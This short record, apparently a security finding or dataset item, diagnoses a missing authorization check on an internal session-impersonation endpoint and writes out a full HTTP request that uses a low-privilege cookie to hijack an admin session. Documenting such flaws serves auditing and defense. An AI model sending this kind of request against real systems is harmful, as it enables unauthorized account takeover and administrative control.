diagnosis: The impersonation endpoint directly reads Redis session records by sid and sets the authentication cookie on the caller's browser. It lacks any authorization check or super-administrator role verification, allowing any low-privilege user who discovers an admin session ID to hijack the session and gain total administrative control over the platform.
exploit_request:
GET /internal/sessions/impersonate/admin_sess_token_88301 HTTP/1.1
Host: admin.saas.internal:9090
Cookie: connect.sid=s%3Alow_priv_user_session
Accept: application/json
